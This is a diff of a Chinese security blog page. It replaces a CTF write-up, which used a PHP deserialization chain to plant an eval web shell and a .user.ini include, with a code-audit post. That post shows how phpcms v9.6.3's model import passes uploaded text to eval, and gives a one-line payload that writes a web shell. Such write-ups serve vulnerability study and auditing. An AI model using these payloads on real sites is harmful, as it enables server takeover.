@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="ctf,">
+  <meta name="keywords" content="代码审计,">
 
 
 
@@ -79,21 +79,20 @@
 
 
 
-<meta name="description" content="非常感谢赵师傅出的题（赵总nb），这里记录一下解题思路 题目给了源码，很熟悉的代码，和之前高校运维赛的ezpop对比一下  发现多了一步使文件名随机，并且比较了后缀并限制了后缀不能为php 高校运维赛的wp：https://250.ac.cn/2019/11/21/2019-EIS-WriteUp/#ezpop 一开始的想法是后缀绕过，然后去爆破文件名，但是经过尝试，失败 经过尝试可以跨目录，这样">
-<meta name="keywords" content="ctf">
+<meta name="description" content="这个cms比较老了，官方也停止了更新，但是可以在码云上找到源码：https://gitee.com/phpcms/phpcms 虽然洞比较老，但是闲来无事考古分析一波也还是比较有意思的 下载下来直接安装，根据README文件，修复了模板渲染的洞，但是还是有getshell的方法 phpcms 代码结构分析一个cms首先是要看它的代码结构，phpcms的结构在这篇文章里已经说的比较详细了。关键的就是">
+<meta name="keywords" content="代码审计">
 <meta property="og:type" content="article">
-<meta property="og:title" content="buu红包题writeup">
-<meta property="og:url" content="http://yoursite.com/2020/01/29/buu-new-year/index.html">
+<meta property="og:title" content="phpcms v9.6.3 后台getshell">
+<meta property="og:url" content="http://yoursite.com/2020/03/05/phpcms-v9-6-3-getshell/index.html">
 <meta property="og:site_name" content="Moyu&#39;s blog">
-<meta property="og:description" content="非常感谢赵师傅出的题（赵总nb），这里记录一下解题思路 题目给了源码，很熟悉的代码，和之前高校运维赛的ezpop对比一下  发现多了一步使文件名随机，并且比较了后缀并限制了后缀不能为php 高校运维赛的wp：https://250.ac.cn/2019/11/21/2019-EIS-WriteUp/#ezpop 一开始的想法是后缀绕过，然后去爆破文件名，但是经过尝试，失败 经过尝试可以跨目录，这样">
+<meta property="og:description" content="这个cms比较老了，官方也停止了更新，但是可以在码云上找到源码：https://gitee.com/phpcms/phpcms 虽然洞比较老，但是闲来无事考古分析一波也还是比较有意思的 下载下来直接安装，根据README文件，修复了模板渲染的洞，但是还是有getshell的方法 phpcms 代码结构分析一个cms首先是要看它的代码结构，phpcms的结构在这篇文章里已经说的比较详细了。关键的就是">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://yoursite.com/2020/01/29/buu-new-year/image-20200129101413584.png">
-<meta property="og:image" content="http://yoursite.com/2020/01/29/buu-new-year/image-20200129104202721.png">
-<meta property="og:updated_time" content="2020-01-29T02:45:27.563Z">
+<meta property="og:image" content="f:%5Cblog%5Cblog%5Csource_posts%5Cphpcms-v9-6-3-getshell%5Cimage-20200306184723461.png">
+<meta property="og:updated_time" content="2020-03-06T10:54:40.318Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="buu红包题writeup">
-<meta name="twitter:description" content="非常感谢赵师傅出的题（赵总nb），这里记录一下解题思路 题目给了源码，很熟悉的代码，和之前高校运维赛的ezpop对比一下  发现多了一步使文件名随机，并且比较了后缀并限制了后缀不能为php 高校运维赛的wp：https://250.ac.cn/2019/11/21/2019-EIS-WriteUp/#ezpop 一开始的想法是后缀绕过，然后去爆破文件名，但是经过尝试，失败 经过尝试可以跨目录，这样">
-<meta name="twitter:image" content="http://yoursite.com/2020/01/29/buu-new-year/image-20200129101413584.png">
+<meta name="twitter:title" content="phpcms v9.6.3 后台getshell">
+<meta name="twitter:description" content="这个cms比较老了，官方也停止了更新，但是可以在码云上找到源码：https://gitee.com/phpcms/phpcms 虽然洞比较老，但是闲来无事考古分析一波也还是比较有意思的 下载下来直接安装，根据README文件，修复了模板渲染的洞，但是还是有getshell的方法 phpcms 代码结构分析一个cms首先是要看它的代码结构，phpcms的结构在这篇文章里已经说的比较详细了。关键的就是">
+<meta name="twitter:image" content="f:%5Cblog%5Cblog%5Csource_posts%5Cphpcms-v9-6-3-getshell%5Cimage-20200306184723461.png">
 
 
 
@@ -123,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/01/29/buu-new-year/">
+  <link rel="canonical" href="http://yoursite.com/2020/03/05/phpcms-v9-6-3-getshell/">
 
 
 
 
 
-  <title>buu红包题writeup | Moyu's blog</title>
+  <title>phpcms v9.6.3 后台getshell | Moyu's blog</title>
   
 
 
@@ -256,7 +255,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/29/buu-new-year/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/05/phpcms-v9-6-3-getshell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Moyu">
@@ -273,7 +272,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">buu红包题writeup</h1>
+          <h1 class="post-title" itemprop="name headline">phpcms v9.6.3 后台getshell</h1>
         
 
         <div class="post-meta">
@@ -285,8 +284,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-29T10:08:17+08:00">
-                2020-01-29
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-05T22:24:31+08:00">
+                2020-03-05
               </time>
             
 
@@ -317,7 +316,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  351
+                  480
                 </span>
               
 
@@ -342,24 +341,24 @@
       
 
       
-        <p>非常感谢赵师傅出的题（赵总nb），这里记录一下解题思路</p>
-<p>题目给了源码，很熟悉的代码，和之前高校运维赛的ezpop对比一下</p>
-<p><img src="image-20200129101413584.png" alt="image-20200129101413584"></p>
-<p>发现多了一步使文件名随机，并且比较了后缀并限制了后缀不能为php</p>
-<p>高校运维赛的wp：<a href="https://250.ac.cn/2019/11/21/2019-EIS-WriteUp/#ezpop" target="_blank" rel="noopener">https://250.ac.cn/2019/11/21/2019-EIS-WriteUp/#ezpop</a></p>
-<p>一开始的想法是后缀绕过，然后去爆破文件名，但是经过尝试，失败</p>
-<p>经过尝试可以跨目录，这样就可以不去爆破文件名，用.user.ini去自动加载一个jpg，然后包含shell</p>
-<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
-<p>解题过程如下</p>
-<p>首先传一个包含shell的图片</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;writeTimes = <span class="number">0</span>;</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">'serialize'</span> =&gt; <span class="string">"base64_decode"</span>, </span><br><span class="line">                      <span class="string">'data_compress'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">                      <span class="string">'prefix'</span> =&gt; <span class="string">"php://filter/write=convert.base64-decode/resource=uploads/moyu"</span>);</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">"/../../aaaaaa.jpg"</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="keyword">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">'qaq'</span>.base64_encode(<span class="string">'&lt;?php @eval($_POST["moyu"]);?&gt;'</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
+        <p>这个cms比较老了，官方也停止了更新，但是可以在码云上找到源码：<a href="https://gitee.com/phpcms/phpcms" target="_blank" rel="noopener">https://gitee.com/phpcms/phpcms</a></p>
+<p>虽然洞比较老，但是闲来无事考古分析一波也还是比较有意思的</p>
+<p>下载下来直接安装，根据README文件，修复了模板渲染的洞，但是还是有getshell的方法</p>
+<h2 id="phpcms-代码结构"><a href="#phpcms-代码结构" class="headerlink" title="phpcms 代码结构"></a>phpcms 代码结构</h2><p>分析一个cms首先是要看它的代码结构，phpcms的结构在<a href="https://www.cnblogs.com/yeyublog/p/7207698.html" target="_blank" rel="noopener">这篇文章</a>里已经说的比较详细了。关键的就是前台在index.php中，后台在admin.php中，具体的功能模块在phpcms/modules/目录下，工具函数在phpcms/libs目录下，想测什么直接去对应就好了</p>
+<h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p>后台getshell的洞大多出在模板渲染、文件上传、数据库操作等地方，README里已经提示修复了模板渲染，所以先看看哪里有文件上传的地方</p>
+<p>在 用户-&gt;会员模型管理-&gt;管理会员模型-&gt;添加会员模型 处可以导入模型</p>
+<p>看一看源码实现(phpcms/modules/member/member_model.php)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'dosubmit'</span>])) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">'model_import'</span>][<span class="string">'tmp_name'</span>])) &#123;</span><br><span class="line">            $model_import = @file_get_contents($_FILES[<span class="string">'model_import'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">empty</span>($model_import)) &#123;</span><br><span class="line">                $model_import_data = string2array($model_import);				</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $is_exists = <span class="keyword">$this</span>-&gt;db-&gt;table_exists($info[<span class="string">'tablename'</span>]);</span><br><span class="line">        <span class="keyword">if</span>($is_exists) showmessage(L(<span class="string">'operation_failure'</span>),<span class="string">'?m=member&amp;c=member_model&amp;a=manage'</span>, <span class="string">''</span>, <span class="string">'add'</span>);</span><br><span class="line"></span><br><span class="line">        $modelid = <span class="keyword">$this</span>-&gt;db-&gt;insert($info, <span class="number">1</span>);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>然后上传.user.ini</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;writeTimes = <span class="number">0</span>;</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">'serialize'</span> =&gt; <span class="string">"base64_decode"</span>, </span><br><span class="line">                      <span class="string">'data_compress'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">                      <span class="string">'prefix'</span> =&gt; <span class="string">"php://filter/write=convert.base64-decode/resource=uploads/moyu"</span>);</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">"/../../.user.ini"</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="keyword">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">'qaq'</span>.base64_encode(<span class="string">"\nauto_prepend_file=aaaaaa.jpg"</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
+<p>将上传的内容经过<code>string2array</code>处理之后赋值给<code>$model_import_data</code>，跟进<code>string2array</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">string2array</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">	$data = trim($data);</span><br><span class="line">	<span class="keyword">if</span>($data == <span class="string">''</span>) <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">if</span>(strpos($data, <span class="string">'array'</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">		@<span class="keyword">eval</span>(<span class="string">"\$array = $data;"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(strpos($data, <span class="string">'&#123;\\'</span>)===<span class="number">0</span>) $data = stripslashes($data);</span><br><span class="line">		$array=json_decode($data,<span class="keyword">true</span>);</span><br><span class="line">		<span class="keyword">if</span>(strtolower(CHARSET)==<span class="string">'gbk'</span>)&#123;</span><br><span class="line">			$array = mult_iconv(<span class="string">"UTF-8"</span>, <span class="string">"GBK//IGNORE"</span>, $array);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>可以看到已经成功getshell</p>
-<p><img src="image-20200129104202721.png" alt="image-20200129104202721"></p>
-<p>剩下的就是读flag了</p>
+<p>可以看到没有任何过滤，而且如果以array开头就直接eval执行，很明显的代码注入</p>
+<p>可以上传一个txt，内容如下，直接写一个shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>);$b=file_put_contents(<span class="string">"moyu.php"</span>,<span class="string">'&lt;?php eval($_REQUEST[moyu]);?&gt;'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>成功写入</p>
+<p><img src="F:%5Cblog%5Cblog%5Csource_posts%5Cphpcms-v9-6-3-getshell%5Cimage-20200306184723461.png" alt="image-20200306184723461"></p>
 
       
     </div>
@@ -377,7 +376,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/ctf/" rel="tag"># ctf</a>
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
           
         </div>
       
@@ -390,8 +389,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/01/25/web-cheat-sheet/" rel="next" title="payload备忘">
-                <i class="fa fa-chevron-left"></i> payload备忘
+              <a href="/2020/02/27/phpmywind-v5-6/" rel="next" title="phpmywind v5.6 后台sql注入+getshell">
+                <i class="fa fa-chevron-left"></i> phpmywind v5.6 后台sql注入+getshell
               </a>
             
           </div>
@@ -399,10 +398,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/02/03/xyhcms-3-6/" rel="prev" title="xyhcms v3.6 代码审计">
-                xyhcms v3.6 代码审计 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -454,8 +449,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -508,6 +512,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#phpcms-代码结构"><span class="nav-number">1.</span> <span class="nav-text">phpcms 代码结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞原理分析"><span class="nav-number">2.</span> <span class="nav-text">漏洞原理分析</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
